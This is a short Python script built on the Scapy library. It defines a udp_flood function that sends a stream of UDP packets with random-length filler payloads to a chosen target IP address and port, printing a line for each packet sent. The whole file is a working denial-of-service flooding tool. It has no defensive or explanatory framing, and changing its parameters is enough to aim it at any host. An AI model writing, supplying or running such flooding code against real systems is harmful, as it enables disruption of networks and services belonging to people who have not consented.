from scapy.all import IP, UDP, Raw, send
import random
import time

def udp_flood(target_ip, target_port=80, packet_count=100):
	print(f"[+] Starting UDP Flood on {target_ip}:{target_port} with {packet_count} packets...")

	for i in range(packet_count):
		payload = Raw(load="X" * random.randint(20, 1400)) 
		packet = IP(dst=target_ip)/UDP(dport=target_port)/payload
		send(packet, verbose=0)
		print(f"[{i+1}] Sent UDP packet")
		time.sleep(0.01)

	print("[+] UDP Flood complete.")
